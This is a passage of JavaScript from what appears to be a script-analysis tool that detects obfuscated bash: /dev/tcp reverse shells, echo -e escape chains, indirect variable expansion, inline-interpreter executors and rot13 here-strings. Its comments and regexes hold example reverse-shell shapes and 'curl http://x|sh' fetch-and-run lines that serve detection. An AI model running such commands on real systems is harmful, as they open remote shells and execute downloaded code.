      // preserves the SENSITIVE_BASH_KEYWORDS hit (the keyword sits
      // near the head of `joined` and the gate above already fired
      // against the pre-clip value) while bounding sidebar size.
      const clippedJoined = _clipDeobfToAmpBudget(joined, raw);
      candidates.push({
        type: 'cmd-obfuscation',
        technique: unresolved === 0
          ? 'Bash Variable Concatenation'
          : 'Bash Variable Concatenation (partial)',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: clippedJoined,
      });
    }

    // ── /dev/tcp reverse shell — the canonical bash reverse-shell
    //    primitive. Structural pattern detection; the regex groups
    //    capture host:port which we extract into `deobfuscated` so the
    //    sidebar shows the pivot target rather than the raw redirect
    //    string. Three shapes we recognise:
    //      (1) bash -i … >& /dev/tcp/host/port        (classic)
    //      (2) /dev/tcp/host/port … 0<& | >& N        (fd redirect pair)
    //      (3) exec N<>/dev/tcp/host/port             (bi-directional
    //          bash bind — the compact form used by tiny stagers
    //          where the shell payload follows via `cat <&N`.)
    //    Sibling YARA rule `Bash_DevTcp_Reverse_Shell` provides parity
    //    detection for decoded-payload / file-scan paths.
    const devTcpRe = /\b(?:bash|sh)\s+-i\b[^\r\n]{0,200}>\s*&?\s*\/dev\/tcp\/[\w.\-]+\/\d{1,5}|\b\/dev\/tcp\/[\w.\-]+\/\d{1,5}\b[^\r\n]{0,200}\b(?:0<&|>&)\d|\bexec\s+\d{1,3}\s*<>\s*\/dev\/tcp\/[\w.\-]+\/\d{1,5}/gi;
    while ((m = devTcpRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const raw = m[0];
      if (raw.length > 500) continue;
      // Extract host:port from the /dev/tcp/host/port atom.
      const hpMatch = /\/dev\/tcp\/([\w.\-]+)\/(\d{1,5})/.exec(raw);
      const host = hpMatch ? hpMatch[1] : null;
      const port = hpMatch ? hpMatch[2] : null;
      const resolved = host && port
        ? `bash /dev/tcp reverse-shell \u2192 ${host}:${port}`
        : `bash /dev/tcp reverse-shell`;
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash /dev/tcp Reverse Shell',
        raw,
        offset: m.index,
        length: raw.length,
        deobfuscated: resolved,
        _executeOutput: true,
        _patternIocs: [{
          url: host && port
            ? `Bash /dev/tcp reverse-shell \u2014 TCP connect-back to ${host}:${port} (T1059.004)`
            : 'Bash /dev/tcp reverse-shell (T1059.004)',
          severity: 'critical',
        }],
      });
    }

    // ── B7: `echo -e` hex/octal executor ────────────────────────
    //
    // `echo -e '\x77\x68\x6f\x61\x6d\x69'` / `echo -e '\167\150…'`.
    // Mirror of B3 (printf chain) but uses echo's `-e` interpret-
    // escapes flag. Accept both `\xNN` and `\NNN` (octal) forms in
    // the same literal. Decoded payload is gated against
    // SENSITIVE_BASH_KEYWORDS to suppress cases like
    // `echo -e 'hello\nworld'` which are ubiquitous in build scripts.
    const echoERe = /\becho\s+(?:-[eE]+|-[neE]+e[neE]*)\s+(['"])((?:\\x[0-9A-Fa-f]{2}|\\[0-7]{1,3}|[^'"\\\r\n]){4,2048})\1/g;
    while ((m = echoERe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const body = m[2];
      let decoded = '';
      let escapeCount = 0;
      let i = 0;
      while (i < body.length) {
        if (body[i] === '\\' && body[i + 1] === 'x'
            && /^[0-9A-Fa-f]{2}$/.test(body.slice(i + 2, i + 4))) {
          decoded += String.fromCharCode(parseInt(body.slice(i + 2, i + 4), 16));
          i += 4;
          escapeCount++;
        } else if (body[i] === '\\' && /^[0-7]{1,3}$/.test(body.slice(i + 1, i + 4))) {
          // Greedy octal match up to 3 digits — echo -e semantics.
          let end = i + 2;
          while (end < i + 4 && end <= body.length && /^[0-7]$/.test(body[end])) end++;
          decoded += String.fromCharCode(parseInt(body.slice(i + 1, end), 8));
          i = end;
          escapeCount++;
        } else {
          decoded += body[i];
          i++;
        }
      }
      // Require ≥3 escapes — lone `\n`/`\t` in a normal echo is not
      // obfuscation. The gate also skips base64-y literals that happen
      // to contain a stray `\xNN` run.
      if (escapeCount < 3) continue;
      if (!this._bruteforce && !SENSITIVE_BASH_KEYWORDS.test(decoded)) continue;
      const clipped = _clipDeobfToAmpBudget(decoded, m[0]);
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash echo -e Escape Chain',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: clipped,
      });
    }

    // ── B8: `${!var}` indirect variable expansion ────────────────
    //
    //   a=whoami
    //   b=a
    //   ${!b}              →  resolves to ${a} → "whoami"
    //   eval "${!b}"       →  common guise
    //
    // Two-hop resolution: `!var` means "use the value of `var` as
    // the NAME of the variable to expand". Only surface when the
    // final resolved value looks command-shaped.
    const indirectRe = /\$\{!([A-Za-z_]\w{0,63})\}/g;
    while ((m = indirectRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const pointerName = m[1];
      const pointerValue = vars[pointerName];
      if (typeof pointerValue !== 'string') continue;
      // Pointer value must itself be a valid bash identifier — that's
      // the whole point of indirect expansion. Reject anything that
      // isn't (suppresses `${!MYOPTS[@]}` array-key form which is a
      // different feature we don't resolve).
      if (!/^[A-Za-z_]\w{0,63}$/.test(pointerValue)) continue;
      const finalValue = vars[pointerValue];
      if (typeof finalValue !== 'string' || finalValue.length < 2) continue;
      if (!this._bruteforce && !SENSITIVE_BASH_KEYWORDS.test(finalValue)) continue;
      const clipped = _clipDeobfToAmpBudget(finalValue, m[0]);
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash Indirect Variable Expansion',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: clipped,
      });
    }

    // ── B9: inline-interpreter executor ──────────────────────────
    //
    //   awk 'BEGIN{system("curl http://x|sh")}'
    //   perl -e 'system("curl http://x|sh")'
    //   python -c 'import os; os.system("curl http://x|sh")'
    //   python3 -c "exec('…')"
    //   ruby  -e 'exec("curl http://x|sh")'
    //   node  -e 'require("child_process").exec("curl http://x|sh")'
    //
    // These are bash-hosted executors that invoke another interpreter
    // to escape downstream signature-matching on `bash`/`sh`. We
    // surface the inline script body as the deobfuscated payload and
    // let the post-processor re-scan it through the cross-shell
    // resolver.
    //
    // Regex is two-pass: a cheap anchor (`interpreter [flag] `)
    // followed by a bounded quoted-body capture. The outer alternation
    // is flat — no nested quantifiers — to stay ReDoS-safe. Recognised
    // flags: `-e` (perl/ruby/node/awk), `-c` (python{,3}/bash), `-r`
    // (php), or bare (awk invokes its script as the first positional
    // arg without a flag).
    const interpRe = /\b(awk|perl|python3?|ruby|node|php)(?:\s+-[ercR]|\s+)\s*(['"])((?:\\.|(?!\2).){3,4096})\2/gi;
    while ((m = interpRe.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const interp = m[1].toLowerCase();
      const body = m[3];
      // Post-decode plausibility: the inline body must call something
      // that looks like an executor (system / exec / os.system /
      // subprocess / `sh`/`bash`/`curl`/`wget`). Otherwise we'd flag
      // every legitimate `awk -e '{print $2}'` in build scripts.
      const bodyExec = /\b(?:system|exec(?:ve|cl|lp)?|os\.system|subprocess|popen|child_process|shell_exec|passthru|Kernel\.|IO\.popen|open\s*\(\s*['"][|])/i;
      if (!this._bruteforce && !bodyExec.test(body)
          && !SENSITIVE_BASH_KEYWORDS.test(body)) continue;
      const clipped = _clipDeobfToAmpBudget(body, m[0]);
      candidates.push({
        type: 'cmd-obfuscation',
        technique: `Bash Inline ${interp} Executor`,
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: clipped,
      });
    }

    // ── B10: tr substitution cipher via here-string ──────────────
    //
    //   tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< 'jrnzvxrrg'   →  rot13 → "whoami…"
    //   tr 'N-ZA-Mn-za-m' 'A-Za-z' <<< 'jrnzvxrrg'   →  rot13 (reversed)
    //   echo 'jrnzvxrrg' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    //
    // Only the two rot13 orientations are resolved here; arbitrary
    // tr(1) translate-sets are too flexible to statically simulate
    // without a real tr engine. The post-decode gate still applies.
    const tr13Re = /\btr\s+(['"])([A-Za-z-]+)\1\s+(['"])([A-Za-z-]+)\3\s+<<<\s*(['"])([^'"\r\n]{4,2048})\5/g;
    while ((m = tr13Re.exec(text)) !== null) {
      throwIfAborted();
      if (candidates.length >= this.maxCandidatesPerType) break;
      const setFrom = m[2];
      const setTo = m[4];
      const input = m[6];
      // Recognise rot13 orientation by canonical set pair; anything
      // else is too generic to statically resolve.
      const isRot13 = (setFrom === 'A-Za-z' && setTo === 'N-ZA-Mn-za-m')
                   || (setFrom === 'N-ZA-Mn-za-m' && setTo === 'A-Za-z')
                   || (setFrom === 'a-zA-Z' && setTo === 'n-za-mN-ZA-M')
                   || (setFrom === 'n-za-mN-ZA-M' && setTo === 'a-zA-Z');
      if (!isRot13) continue;
      let decoded = '';
      for (let j = 0; j < input.length; j++) {
        const c = input.charCodeAt(j);
        if (c >= 65 && c <= 90)      decoded += String.fromCharCode(((c - 65 + 13) % 26) + 65);
        else if (c >= 97 && c <= 122) decoded += String.fromCharCode(((c - 97 + 13) % 26) + 97);
        else                          decoded += input[j];
      }
      if (!this._bruteforce && !SENSITIVE_BASH_KEYWORDS.test(decoded)) continue;
      const clipped = _clipDeobfToAmpBudget(decoded, m[0]);
      candidates.push({
        type: 'cmd-obfuscation',
        technique: 'Bash tr rot13 Here-String',
        raw: m[0],
        offset: m.index,
        length: m[0].length,
        deobfuscated: clipped,
      });
    }

    return candidates;
  },
});
